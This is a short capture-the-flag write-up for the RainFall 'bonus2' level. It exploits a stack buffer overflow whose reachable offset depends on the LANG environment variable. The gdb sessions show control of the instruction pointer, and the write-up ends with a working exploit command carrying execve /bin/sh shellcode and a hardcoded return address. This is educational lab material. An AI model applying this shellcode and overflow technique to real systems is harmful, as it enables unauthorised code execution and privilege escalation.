The prog takes to args, and greet us in a specific language based on env LANG.
ltrace show that the first buffer is 40 byte, and the second 32. Lets try to overflow that :
```
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "D"*40') $(python -c 'print "U"*40')
Hello DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU

Program received signal SIGSEGV, Segmentation fault.
0x08005555 in ?? ()
```
We see some 0x55 ('U'), so we should be able to control the code flow...
But not only 0x55 here. The other language must be here for a reason. Lets try to set LANG to 'fi' or 'nl'
(got those keys from breaking at memcmp in gdb and printing the args)

```
bonus2@RainFall:~$ LANG=nl
bonus2@RainFall:~$ gdb bonus2 
(gdb) r $(python -c 'print "D"*40') $(python -c 'print "U"*40')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "D"*40') $(python -c 'print "U"*40')
Goedemiddag! DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```
Good
Pattern tool tells us offset is 23.
So we simply replace the first arg by our shellcode (and some NOP as padding for good mesure), check the address it's written to with ltraces and put that at offset 23 in the second arg :
```
./bonus2 $(python -c 'print "\x90"*19 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print "U"*23 + "\x70\xfb\xff\xbf" + "U"*13')
```
